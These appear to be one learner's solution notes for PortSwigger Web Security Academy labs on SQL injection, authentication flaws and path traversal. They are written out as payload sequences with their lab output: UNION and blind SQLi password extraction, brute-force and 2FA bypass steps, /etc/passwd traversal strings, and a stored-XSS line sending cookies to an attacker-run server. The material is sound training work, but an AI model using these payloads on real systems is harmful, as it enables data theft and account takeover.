
# **[Web Security Academy][web_security_academy]**

## **Level Notes** <sub><sup><sub>by [Psycho][author's_twitter]</sub></sup></sub>

### **Web Security**

> “The Web Security Academy is a free online training center for web application security.  
> It includes content from PortSwigger's in-house research team, experienced academics,  
> and our Chief Swig Dafydd Stuttard - author of The Web Application Hacker's Handbook.
>
> Unlike a textbook, the Academy is constantly updated. It also includes interactive labs  
> where you can put what you learn to the test. If you want to improve your knowledge of hacking,  
> or you'd like to become a bug bounty hunter or pentester, you're in the right place.”

[Getting Started][wsa_getting_started]  
[Learning Path][wsa_learning_path]  
[All Labs][wsa_all_labs]

### **Burp Suite**

[Documetation][burp_desktop]  
[Video Tutorials][burp_video_tutorials]

[web_security_academy]: https://portswigger.net/web-security
[author's_twitter]:     https://www.twitter.com/UDPsycho
[wsa_getting_started]:  https://portswigger.net/web-security/getting-started
[wsa_learning_path]:    https://portswigger.net/web-security/learning-path
[wsa_all_labs]:         https://portswigger.net/web-security/all-labs
[burp_desktop]:         https://portswigger.net/burp/documentation/desktop
[burp_video_tutorials]: https://portswigger.net/burp/pro/video-tutorials

<br>

# Server-Side Topics

## **SQL Injection**

### [SQLi cheat sheet][sqli_cheat_sheet]

### [Retrieving hidden data][sqli_retrieving_hidden_data]

1. #### **SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

    ```sql
    Pets
    Pets'
    Pets'+AND+1=1--+
    Pets'+AND+1=0--+
    Pets'+OR+1=1--+
    ```

### [Subverting application logic][sqli_subverting_application_logic]

2. #### **SQL injection vulnerability allowing login bypass**

    ```sql
    administrator'--+
    letmein
    ```

### [SQL injection UNION attacks][sqli_union_attacks]

3. #### **SQL injection UNION attack, determining the number of columns returned by the query**

    ```sql
    Lifestyle
    Lifestyle'
    Lifestyle'+ORDER+BY+10--+
    Lifestyle'+ORDER+BY+5--+
    Lifestyle'+ORDER+BY+3--+
    Lifestyle'+UNION+SELECT+null,null,null--+
    ```

4. #### **SQL injection UNION attack, finding a column containing text**

    ```sql
    Tech+gifts
    Tech+gifts'
    Tech+gifts'+ORDER+BY+10--+
    ...
    Tech+gifts'+ORDER+BY+3--+
    Tech+gifts'+UNION+SELECT+null,null,null--+
    Tech+gifts'+UNION+SELECT+'a',null,null--+
    Tech+gifts'+UNION+SELECT+null,'a',null--+
    Tech+gifts'+UNION+SELECT+null,null,'a'--+
    Tech+gifts'+UNION+SELECT+null,'<payload>',null--+
    ```

5. #### **SQL injection UNION attack, retrieving data from other tables**

    ```sql
    Food+&+Drink
    Food+%26+Drink'
    Food+%26+Drink'+ORDER+BY+10--+
    ...
    Food+%26+Drink'+ORDER+BY+2--+
    Food+%26+Drink'+UNION+SELECT+null,null--+
    Food+%26+Drink'+UNION+SELECT+'a',null--+
    Food+%26+Drink'+UNION+SELECT+null,'a'--+

    v1: Food+%26+Drink'+UNION+SELECT+username,password+FROM+users--+
    v2: '+UNION+SELECT+username,password+FROM+users--+

    administrator
    juzh2wn9ora63r6pxl8b
    carlos
    sedhheoi7cbd4320g53h
    wiener
    b8tr0redpjyjhk2usqte
    ```

6. #### **SQL injection UNION attack, retrieving multiple values in a single column [on PostgreSQL]**

    ```sql
    '
    '+ORDER+BY+10--+
    ...
    '+ORDER+BY+2--+
    '+UNION+SELECT+null,null--+
    '+UNION+SELECT+null,'a'--+
    '+UNION+SELECT+null,@@version--+
    '+UNION+SELECT+null,version()--+
    '+UNION+SELECT+null,username||':'||password+FROM+users--+

    administrator:f6qbqbsagrrvalh8rlgn
    carlos:ga3cbtzle95cewsaiabd
    wiener:7ox6rd3ve2ghwdml6hh8  
    ```

### [Examining the database in SQL injection attacks][sqli_examining_the_database]

7. #### **SQL injection attack, querying the database type and version on Oracle**

    ```sql
    '
    '+ORDER+BY+10--+
    ...
    '+ORDER+BY+2--+
    '+UNION+SELECT+null,null--+
    '+UNION+SELECT+null,null+FROM+dual--+
    '+UNION+SELECT+null,'a'+FROM+dual--+

    v1: '+UNION+SELECT+null,banner+FROM+v$version--+

    CORE 11.2.0.2.0 Production
    NLSRTL Version 11.2.0.2.0 - Production
    Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
    PL/SQL Release 11.2.0.2.0 - Production
    TNS for Linux: Version 11.2.0.2.0 - Production


    v2: '+UNION+SELECT+null,version+FROM+v$instance--+

    11.2.0.2.0
    ```

8. #### **SQL injection attack, querying the database type and version on MySQL and Microsoft**

    ```sql
    '
    '+ORDER+BY+10--+
    ...
    '+ORDER+BY+2--+
    '+UNION+SELECT+null,null--+
    '+UNION+SELECT+null,'a'--+
    '+UNION+SELECT+null,@@version--+

    8.0.28
    ```

9. #### **SQL injection attack, listing the database contents on non-Oracle databases [on PostgreSQL]**

    ```sql
    '
    '+ORDER+BY+10--+
    ...
    '+ORDER+BY+2--+
    '+UNION+SELECT+null,null--+
    '+UNION+SELECT+null,'a'--+
    '+UNION+SELECT+null,@@version--+
    '+UNION+SELECT+null,version()--+
    '+UNION+SELECT+null,table_name+FROM+information_schema.tables--+

    pg_extension
    ...
    pg_stat_ssl


    '+UNION+SELECT+null,column_name+FROM+information_schema.columns+WHERE+table_name='users_ofvjie'--+

    username_mlkloc
    password_sbcyoy


    '+UNION+SELECT+null,username_mlkloc||':'||password_sbcyoy+FROM+users_ofvjie--+

    ljucg64gbyb9im1d4qnr:administrator
    k4fnsu3ypxf6xhvdl6uo:wiener
    asqnndhx0duy8o6ihvcd:carlos
    ```

10. #### **SQL injection attack, listing the database contents on Oracle**

    ```sql
    '
    '+ORDER+BY+10--+
    ...
    '+ORDER+BY+2--+
    '+UNION+SELECT+null,null--+
    '+UNION+SELECT+null,'a'--+
    '+UNION+SELECT+null,banner+FROM+v$version--+
    '+UNION+SELECT+null,table_name+FROM+all_tables--+

    ACCESS$
    ALERT_QT
    APEX$_ACL
    ...
    XSTREAM$_SUBSET_RULES
    XSTREAM$_SYSGEN_OBJS
    _default_auditing_options_


    '+UNION+SELECT+null,column_name+FROM+all_tab_columns+WHERE+table_name='USERS_SRDZXP'--+

    PASSWORD_PBSDQA
    USERNAME_UCSPNN


    '+UNION+SELECT+null,USERNAME_UCSPNN||':'||PASSWORD_PBSDQA +FROM+USERS_SRDZXP--+

    administrator:i7y3yvv6wwhncqh5ib3a
    carlos:i88mkudi5ib4e5h4pd76
    wiener:43zoumrp40l79jfp2n5h
    ```

### [Blind SQL injection][sqli_blind]

11. #### **Blind SQL injection with conditional responses**

    > 📝 **Note:**
    <mark>If like me you don't have Burp Suite Pro, you can use one of
    [these][sqli_script_conditional_responses] scripts to automate the last part of the attack.</mark>

    ```sql
                        (Content-Length: 2963, "Welcome" message appears)
    '                   (Content-Length: 2902, "Welcome" message DOESN'T appears)
    '+AND+'1'='1        (Content-Length: 2963, "Welcome" message appears)
    '+AND+'1'='0        (Content-Length: 2902, "Welcome" message DOESN'T appears)

    '+ORDER+BY+10--+
    ...
    '+ORDER+BY+1--+

    '+AND+(SELECT '1')='1

    *** FALTA: Cómo sacar el total de tablas y su nombre. ***

    '+AND+(SELECT '1' FROM users LIMIT 1)='1

    *** FALTA: Cómo sacar el total de columnas de una tabla y su nombre. ***

    '+AND+(SELECT '1' FROM users WHERE username='administrator')='1

    '+AND+(SELECT '1' FROM users WHERE username = 'administrator' AND LENGTH(password)>10)='1
    ...
    '+AND+(SELECT '1' FROM users WHERE username = 'administrator' AND LENGTH(password)=20)='1


    '+AND+(SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator')='a
    ...
    '+AND+(SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator')='z

    ...

    '+AND+(SELECT SUBSTRING(password,20,1) FROM users WHERE username = 'administrator')='a
    ...
    '+AND+(SELECT SUBSTRING(password,20,1) FROM users WHERE username = 'administrator')='r

    z5ta0ialqfrn6upo5xlr
    ```

12. #### **Blind SQL injection with conditional errors**

    > 📝 **Note:**
    <mark>If like me you don't have Burp Suite Pro, you can use one of
    [these][sqli_script_conditional_errors] scripts to automate the last part of the attack.</mark>

    ```sql
                        (Content-Length: 2893, 200 OK)
    '                   (Content-Length: 2132, 500 Internat Server Error)

    '+AND+'1'='1        (Content-Length: 2893, 200 OK)
    '+AND+'1'='0        (Content-Length: 2893, 200 OK)
    '+AND+1=1--+        (Content-Length: 2893, 200 OK)
    '+AND+1=0--+        (Content-Length: 2893, 200 OK)
    '+AND+1='a'--+      (Content-Length: 2132, 500 Internat Server Error)

    ''                  (Content-Length: 2893, 200 OK)  
                        (With double quotes, the error disappears. This suggests that a syntax error  
                        [in this case, the unclosed quotation mark] is having a detectable effect on the response.)

    '+ORDER+BY+10--+
    ...
    '+ORDER+BY+1--+

    '+UNION+SELECT+null--+
    v1: '+UNION+SELECT+null+FROM+dual--+
    v2: ' || (SELECT null FROM dual) || '

    v1: '+UNION+SELECT+null+FROM+users--+
    v2: ' || (SELECT null FROM users WHERE ROWNUM = 1) || '

    ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
    ' || (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '

    ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '

    ' || (SELECT CASE WHEN (LENGTH(password)>10) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
    ...
    ' || (SELECT CASE WHEN (LENGTH(password)=20) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '


    ' || (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
    ...
    ' || (SELECT CASE WHEN (SUBSTR(password,1,1)='8') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '

    ...

    ' || (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
    ...
    ' || (SELECT CASE WHEN (SUBSTR(password,20,1)='8') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '

    8knjfapro4g999hxxxn8
    ```

13. #### **Blind SQL injection with time delays**

    > 📝 **Note:**
    <mark>None of the previous techniques works because
    "the application now catches database errors and handles them gracefully.  
    Triggering a database error when the injected SQL query is executed
    no longer causes any difference in the application's response".</mark>

    ```sql
    v1.1:   ' || pg_sleep(5) || '
    v1.2:   ' || pg_sleep(5)--+
    v1.3:   ' || (SELECT pg_sleep(5)) || '

    v2:     '%3b+SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--+
    ```

14. #### **Blind SQL injection with time delays and information retrieval**

    > 📝 **Note:**
    <mark>None of the previous techniques works because
    "the application now catches database errors and handles them gracefully.  
    Triggering a database error when the injected SQL query is executed
    no longer causes any difference in the application's response".</mark>

    ```sql
    '%3b (SELECT pg_sleep(5))--+

    '%3b+(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--+
    '%3b+(SELECT CASE WHEN (1=0) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--+

    '%3b+(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--+

    '%3b+(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND length(password)>10)--+
    ...
    '%3b+(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND length(password)=20)--+


    '%3b+(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--+
    ...
    '%3b+(SELECT CASE WHEN (SUBSTR(password,1,1)='b') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--+

    ...

    '%3b+(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--+
    ...
    '%3b+(SELECT CASE WHEN (SUBSTR(password,20,1)='d') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--+

    be4o117s8qn0wuchy41d
    ```

15. #### **Blind SQL injection with out-of-band interaction**

    ```plaintext
    PENDING UNTIL I GET THE BURP SUITE PRO VERSION
    ```

16. #### **Blind SQL injection with out-of-band data exfiltration**

    ```plaintext
    PENDING UNTIL I GET THE BURP SUITE PRO VERSION
    ```

[sql_injection]:                     https://portswigger.net/web-security/sql-injection
[sqli_cheat_sheet]:                  https://portswigger.net/web-security/sql-injection/cheat-sheet
[sqli_retrieving_hidden_data]:       https://portswigger.net/web-security/sql-injection#retrieving-hidden-data
[sqli_subverting_application_logic]: https://portswigger.net/web-security/sql-injection#subverting-application-logic
[sqli_union_attacks]:                https://portswigger.net/web-security/sql-injection/union-attacks
[sqli_examining_the_database]:       https://portswigger.net/web-security/sql-injection/examining-the-database
[sqli_blind]:                        https://portswigger.net/web-security/sql-injection/blind
[sqli_script_conditional_responses]: https://github.com/UDPsycho/SecurityLabs/tree/main/Web%20Security%20Academy/Resources/SQL%20Injection/Blind%20SQL%20injection%20with%20conditional%20responses
[sqli_script_conditional_errors]:    https://github.com/UDPsycho/SecurityLabs/tree/main/Web%20Security%20Academy/Resources/SQL%20Injection/Blind%20SQL%20injection%20with%20conditional%20errors

---

## **[Authentication][authentication]**

### [Vulnerabilities in password-based login][auth_password_based]

1. #### **Username enumeration via different responses**

    ```plaintext
    carlos:letmein      (Invalid username)
    root:letmein        (Invalid username)
    admin:letmein       (Invalid username)
    ...
    guest:letmein       (Invalid password)
    guest:123456        (Invalid password)
    guest:password      (Invalid password)
    guest:12345678      (Invalid password)
    ...
    guest:000000        (302 OK)
    ```

2. #### **Username enumeration via subtly different responses**

    ```plaintext
    carlos:letmein      (Invalid username or password.)
    root:letmein        (Invalid username or password.)
    admin:letmein       (Invalid username or password.)
    ...
    apollo:letmein      (Invalid username or password) ← Notice that the dot is missing.
    apollo:123456       (Invalid username or password)
    apollo:password     (Invalid username or password)
    apollo:12345678     (Invalid username or password)
    ...
    apollo:dragon       (302 OK)
    ```

3. #### **Username enumeration via response timing**

    > 📝 **Note:**
    <mark>Your IP is temporarily blocked (4th attempt) if you submit 3 incorrect logins.</mark>

    - Try to login with invalid credentials (**carlos:letmein**).
    - Login with valid credentials (**wiener:peter**).
    - Send both request to the **Repeater**.
    - Repeat the first one until you being blocked, the message  
    ***"You have made too many incorrect login attempts. Please try again in 30 minute(s)."*** will appear.
    - Add the **X-Forwarded-For** header w/any payload and repeat the request once more  
    (notice that the previous message disappears).
    - Repeat both request but using a very long password (**100+ characters**) and see the response time difference  
    (notice that the second one takes longer, suggesting the username is correct).

    <br>

    ```plaintext
    carlos:letmeinletmeinletmeinletmeinletmeinletmeinletmeinletmeinletmeinletmeinletmeinletmeinletmeinletmeinletmein
    wiener:letmeinletmeinletmeinletmeinletmeinletmeinletmeinletmeinletmeinletmeinletmeinletmeinletmeinletmeinletmein
    ```

    - Send the first one to the **Intruder**.
    - Set the **Pitchfork** attack.
    - Add two marks to the **X-Forwarded-For** header payload and the username payload.
    - Set both payloads (1: numbers, 2: usernames) then execute the attack.

    <br>

    ```plaintext
    1:carlos:letmeinletmeinletmein...
    2:root:letmeinletmeinletmein...
    3:admin:letmeinletmeinletmein...
    ...
    100:autodiscover:letmeinletmeinletmein...
    ```

    - Click the **Columns** menu and enable **Response received** and **Response completed**.
    - Order by **Response received** to determine the valid username  
    (notice that the time shown will be similar to the time of the request with the correct username).
    - Use that username to brute force its password with another **Pitchfork** attack.

    <br>

    ```plaintext
    auth:ranger
    ```

4. #### **Broken brute-force protection, IP block**

    > 📝 **Note:**
    <mark>Your IP is temporarily blocked (4th attempt) if you submit 3 incorrect logins in a row.</mark>
    >
    > 📝 **Note:**
    <mark>If like me you don't have Burp Suite Pro, you can use
    [this][auth_script_ip_block] script to automate the attack.</mark>

    - Try to login with invalid credentials (**carlos:letmein**).
    - Send the request to the **Repeater**.
    - Repeat the request until you being blocked, the message  
    ***"You have made too many incorrect login attempts. Please try again in 1 minute(s)."*** will appear.
    - Wait for a minute to allow the account lock to reset.
    - Try to login with invalid credentials twice (**carlos:letmein**).
    - Login with valid credentials once (**wiener:peter**).
    - Try to login with invalid credentials twice again (**carlos:letmein**)  
    (notice that the counter for the number of failed login attempts was reset).
    - Send the valid login request to the **Intruder**.
    - Set the **Pitchfork** attack.
    - Add two marks to the username payload and the password payload.
    - Set both payloads (1: usernames, 2: passwords) aligned then execute the attack.

    <br>

    ```plaintext
    wiener:peter
    carlos:123456
    carlos:password
    wiener:peter
    carlos:12345678
    carlos:qwerty
    wiener:peter
    carlos:123456789
    carlos:12345
    ...
    carlos:matthew
    ```

5. #### **Username enumeration via account lock**

    > 📝 **Note:**
    <mark>The account is temporarily blocked (4th attempt) if you submit 3 incorrect logins
    (even if the attempts aren't in a row).<mark>
    >
    > 📝 **Note:**
    <mark>If like me you don't have Burp Suite Pro, you can use
    [these][auth_script_account_lock] scripts to automate the attack.</mark>

    - Try to login with any credentials (**carlos:letmein**).
    - Send the request to the **Repeater**.
    - Repeat the request 5 more times, If the username exists then the message  
    ***"You have made too many incorrect login attempts. Please try again in 1 minute(s)."*** will appear,  
    otherwhise if the username doesn't exist then the message always will be ***"Invalid username or password."***.
    - Send the request to the **Intruder**.
    - Set the **Cluster bomb** attack.
    - Add two marks to the username payload and the end of the password payload  
    (**username=§carlos§&password=letmein§§**).
    - Set and configure both payloads (1: usernames, 2: null payloads w/five rounds) then execute the attack.
    - The previous message ***"You have made too many incorrect login attempts. Please try again in 1 minute(s)."***  
    will appear when you find the valid username.
    - Send that request to the **Intruder**.
    - Set the **Sniper** attack.
    - Add a mark to the password payload.
    - Set the payloads (1: passwords).
    - Click the **Options** menu and add a **Grep - Extract** rule for the error message then execute the attack.
    - No message will appear when you find the valid password.
    - Wait for a minute to allow the account lock to reset.

    <br>

    ```plaintext
    root:monitor
    ```

6. #### **Broken brute-force protection, multiple credentials per request**

    - Try to login with invalid credentials (**carlos:letmein**)  
    (notice that now the application send the data using **json**).
    - Send an array of passwords instead of a single one.

    <br>

    ```json
    {
        "username":"carlos",
        "password":[
            "123456",
            "password",
            "12345678",
            ...
            "montana",
            "moon",
            "moscow"
        ]
    }
    ```

    - Right click in the **Request** and select **Show response in browser**
    then copy the URL and paste into the browser that's using Burp Suite.

### [Vulnerabilities in multi-factor authentication][auth_multi_factor]

1. #### **2FA simple bypass**

    - Login with valid credentials (**wiener:peter**) and take note of the URL flow.

    <br>

    ```plaintext
    https://<lab_url>/login
    https://<lab_url>/login2
    https://<lab_url>/my-account
    ```

    - Login with valid credentials (**carlos:montoya**) and when prompted for the verification code
    (**/login2** page) just change manually the page to **/my-account**.

    <br>

    ```plaintext
    https://<lab_url>/login
    https://<lab_url>/my-account
    ```

2. #### **2FA broken logic**

    - Login with valid credentials (**wiener:peter**) and take note of the URL flow and the parameters sent.

    <br>

    ```plaintext
    https://<lab_url>/login         GET
    https://<lab_url>/login         POST    (username=wiener&password=peter)
    https://<lab_url>/login2        GET     (Cookie: verify=wiener)
    https://<lab_url>/email         GET
    https://<lab_url>/login2        POST    (Cookie: verify=wiener, mfa-code=<payload>)
    https://<lab_url>/my-account    GET     (Cookie: verify=wiener)
    ```

    - Send the **/login2 GET** request to the **Repeater**.
    - Repeat the request but using the cookie **verify=carlos**  
    (this ensures that a temporary 2FA code is generated for carlos).
    - Login with valid credentials (**wiener:peter**).
    - Send any verification code.
    - Send the request to the **TURBO INTRUDER** then setup and execute the attack.
    - Right click in the **Request** and select **Show response in browser**
    then copy the URL and paste into the browser that's using Burp Suite.

3. #### **2FA bypass using a brute-force attack**

    > 📝 **Note:**
    <mark>You will be logged out if you submit 2 incorrect verification codes and your
    **session cookie** and **csrf token** will change.<mark>

    - Login with valid credentials (**wiener:peter**) and take note of the URL flow and the parameters sent.

    <br>

    ```plaintext
    https://<lab_url>/login         GET     (Cookie: session=HSBnk8T3rJjBd4tF9DG8pKLgQmPZfVSx)

    https://<lab_url>/login         POST    (Cookie: session=HSBnk8T3rJjBd4tF9DG8pKLgQmPZfVSx,  
                                            csrf=LDqf6Cs8KpohxAAcfuNPpCkarDmhmYb1&username=wiener&password=peter)

    https://<lab_url>/login2        GET     (Cookie: session=X2O1AybOXc768ZXolamqTHvLiRzbJJRt)

    https://<lab_url>/login2        POST    (Cookie: session=X2O1AybOXc768ZXolamqTHvLiRzbJJRt,  
                                            csrf=k6IQOxYwN8DQYLbhclysU3Wh5aFOswW9&mfa-code=<payload>)

    https://<lab_url>/login2        POST    (Cookie: session=X2O1AybOXc768ZXolamqTHvLiRzbJJRt,  
                                            csrf=k6IQOxYwN8DQYLbhclysU3Wh5aFOswW9&mfa-code=<payload>)
    ```

    - Set up a **MACRO** to enable the
    ***"session handling features to log back in automatically before sending each request"***.
    - Send the **/login2 POST** request to the **Intruder**.
    - Set the **Sniper** attack.
    - Add a mark to the verification code payload.
    - Set the payloads (1, numbers) then execute the attack.
    - Right click in the **Request** and select **Show response in browser**
    then copy the URL and paste into the browser that's using Burp Suite.

### [Vulnerabilities in other authentication mechanisms][auth_other_mechanisms]

1. #### **Brute-forcing a stay-logged-in cookie**

    > 📝 **Note:**
    <mark>You can use
    [this][auth_script_stay-logged-in_cookie] script to automate the payloads creation.</mark>

    - Login with valid credentials (**wiener:peter**) and take note of the URL flow and the parameters sent  
    (don't forget to enable the **Stay logged in** check box).

    <br>

    ```plaintext
    https://<lab_url>/login         GET
    https://<lab_url>/login         POST    (username=wiener&password=peter&stay-logged-in=on)
    https://<lab_url>/my-account    GET     (Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw)
    ```

    - Be creative and find out what **d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw** stands for  
    (it's a **Base64** encoded value).
    - Send the value to the **Decoder** and decode it (**wiener:51dc30ddc473d43a6011e9ebba6ca770**).
    - Be creative and find out what **51dc30ddc473d43a6011e9ebba6ca770** stands for  
    (it's a **MD5** encrypted value).
    - Use your preferred tool to "decrypt" the value (**peter**).
    - Now that you know the mechanism of how cookies are generated,
    create all the possible cookies for the username **carlos**.
    - Send the **/my-account GET** request to the **Intruder**.
    - Set the **Sniper** attack.
    - Add a mark to the cookie payload.
    - Set the payloads (1, possible cookies) then execute the attack.

    <br>

    ```plaintext
    Y2FybG9zOmQxMTMzMjc1ZWUyMTE4YmU2M2E1NzdhZjc1OWZjMDUy (carlos:joshua)
    ```

2. #### **Offline password cracking**

    > 📝 **Note:**
    <mark>The account is temporarily blocked (4th attempt) if you submit 3 incorrect logins
    (even if the attempts aren't in a row)  
    and the counter for the number of failed login attempts cannot be reset by logging in on a valid account.</mark>

    - Login with valid credentials (**wiener:peter**) and take note of the URL flow and the parameters sent  
    (don't forget to enable the **Stay logged in** check box).

    <br>

    ```plaintext
    https://<lab_url>/login         GET     (Cookie: session=bEiPWmrzlvxBVioeDbajJ3OAjhxHc0Ae)

    https://<lab_url>/login         POST    (Cookie: session=bEiPWmrzlvxBVioeDbajJ3OAjhxHc0Ae,  
                                            username=wiener&password=peter&stay-logged-in=on)

    https://<lab_url>/my-account    GET     (Cookie: session=a7WhOO0mQ11DWzImYQJdn4ioU8P4Fk5a;  
                                            stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw)

    https://<lab_url>/logout        GET     (Cookie: session=a7WhOO0mQ11DWzImYQJdn4ioU8P4Fk5a;  
                                            stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw)
    ```

    - Be creative and find out what **d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw** stands for  
    (it's a **Base64** encoded value).
    - Send the value to the **Decoder** and decode it (**wiener:51dc30ddc473d43a6011e9ebba6ca770**).
    - Be creative and find out what **51dc30ddc473d43a6011e9ebba6ca770** stands for  
    (it's a **MD5** encrypted value).
    - Use your preferred tool to "decrypt" the value (**peter**).
    - Go to one of the blog posts and exploit the **Stored XSS** vulnerability in the comments section
    to send all the cookies of the users who visit the post to a server under your control.

    <br>

    ```plaintext
    <script>alert(1);</script>
    <script>var i=new Image;i.src="<script>document.location="
    https://exploit-acaa1ffe1e25110cc0c83285013800db.web-security-academy.net/"+document.cookie;</script>
    ```

    - Check the **Access log** of the server and look for the request containing the expected information.

    <br>

    ```plaintext
    ... secret=R1cHkoyd7CISQXfqqPJF56eG9G2TwMqj;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz ...
    ```

    - Decode (**Base64**) and "decrypt" (**MD5**) the **stay-logged-in** cookie value.

    <br>

    ```plaintext
    carlos:26323c16d5f4dabff3bb136f2460a943 (carlos:onceuponatime)
    ```

    - Login with the credentials and delete the account.

3. #### **Password reset broken logic**

    - Click **Forgot password?** then complete the whole proccess with a valid username (**wiener**)  
    and take note of the URL flow and the parameters sent.

    <br>

    ```plaintext
    https://<lab_url>/login             GET

    https://<lab_url>/forgot-password   GET

    https://<lab_url>/forgot-password   POST    (username=wiener)

    https://<lab_url>/email             GET

    https://<lab_url>/forgot-password   GET     (temp-forgot-password-token=Efclm8DmnNeX9QZkCsfQlgaWuVbOkN5Z)

    https://<lab_url>/forgot-password   POST    (temp-forgot-password-token=Efclm8DmnNeX9QZkCsfQlgaWuVbOkN5Z  
                                                &username=wiener&new-password-1=<payload>&new-password-2=<payload>)
    ```

    - Repeat the **/forgot-password POST** request  
    (notice that's still working even if the password just changed).

    - Repeat the **/forgot-password POST** request but deleting the value of the
    **temp-forgot-password-token** in both the URL and request body  
    (notice that's still working even if the token value is empty).

    ```plaintext
    POST /forgot-password?temp-forgot-password-token=
    ...
    temp-forgot-password-token=&username=wiener&new-password-1=<payload>&new-password-2=<payload>
    ```

    - Repeat the **/forgot-password POST** request (w/any of the previous variants)
    but using the username **carlos** and the password you want.

4. #### **Password brute-force via password change**

    - Login with valid credentials (**wiener:peter**) then change your password and take note
    of the URL flow and the parameters sent.

    <br>

    ```plaintext
    https://<lab_url>/login                         GET     (session=oL5vfPo8W77vqQA3uBxMTbPhxWefTIKy)

    https://<lab_url>/login                         POST    (session=oL5vfPo8W77vqQA3uBxMTbPhxWefTIKy,
                                                            username=wiener&password=peter)

    https://<lab_url>/my-account                    GET     (session=tyzKZkYzBEnaS8erwdf5uLY4XLVYsCVy)

    https://<lab_url>/my-account/change-password    POST    (session=tyzKZkYzBEnaS8erwdf5uLY4XLVYsCVy,
                                                            username=wiener&current-password=peter
                                                            &new-password-1=<payload>&new-password-2=<payload>)

    https://<lab_url>/my-account                    GET     (session=tyzKZkYzBEnaS8erwdf5uLY4XLVYsCVy)
    ```

    - Login again and experiment with the password change functionality  
    (notice the following:  
      - a) If the **Current password** is wrong and both **New password** match, the account is locked  
      [you are redirected to the login page and if you try to login again, the message  
      ***"You have made too many incorrect login attempts. Please try again in 1 minute(s)."***] will appear.
      - b) If the **Current password** is wrong and both **New password** doesn't match, the message  
        ***"Current password is incorrect"*** will appear.
      - c) If the **Current password** is ok but both **New password** doesn't match, the message  
        ***"New passwords do not match"*** will appear.).

    <br>

    - Send the **/my-account/change-password POST** request to the **Intruder**.
    - Set the **Sniper** attack.
    - Add a mark to the current password payload.
    - Set the payloads (1: passwords).
    - Set the username payload (**carlos**) and the new-password-1 and new-password-2 payloads different.
    - Click the **Options** menu and add a **Grep - Match** rule for the **c)** error message then execute the attack.

    <br>

    ```plaintext
    carlos:michelle
    ```

[authentication]:                    https://portswigger.net/web-security/authentication
[auth_password_based]:               https://portswigger.net/web-security/authentication/password-based
[auth_script_ip_block]:              https://github.com/UDPsycho/SecurityLabs/tree/main/Web%20Security%20Academy/Resources/Authentication/Broken%20brute-force%20protection%20IP%20block
[auth_script_account_lock]:          https://github.com/UDPsycho/SecurityLabs/tree/main/Web%20Security%20Academy/Resources/Authentication/Username%20enumeration%20via%20account%20lock
[auth_multi_factor]:                 https://portswigger.net/web-security/authentication/multi-factor
[auth_other_mechanisms]:             https://portswigger.net/web-security/authentication/other-mechanisms
[auth_script_stay-logged-in_cookie]: https://github.com/UDPsycho/SecurityLabs/tree/main/Web%20Security%20Academy/Resources/Authentication/Brute-forcing%20a%20stay-logged-in%20cookie

---

## **[Directory Traversal][directory_traversal]**

1. #### **File path traversal, simple case**

    ```plaintext
    https://<lab_url>/product   GET   (productId=1)
    https://<lab_url>/image     GET   (filename=10.jpg)

    filename=../../../etc/passwd
    ```

2. #### **File path traversal, traversal sequences blocked with absolute path bypass**

    ```plaintext
    https://<lab_url>/product   GET   (productId=2)
    https://<lab_url>/image     GET   (filename=20.jpg)

    filename=/etc/passwd
    ```

3. #### **File path traversal, traversal sequences stripped non-recursively**

    ```plaintext
    https://<lab_url>/product   GET   (productId=3)
    https://<lab_url>/image     GET   (filename=30.jpg)

    v1: filename=....//....//....//etc/passwd
    v2: filename=..././..././..././etc/passwd
    ```

4. #### **File path traversal, traversal sequences stripped with superfluous URL-decode**

    ```plaintext
    https://<lab_url>/product   GET   (productId=4)
    https://<lab_url>/image     GET   (filename=40.jpg)

    filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd                       (NO, URL encode)
    filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd                     (NO, semi-complete URL encode)
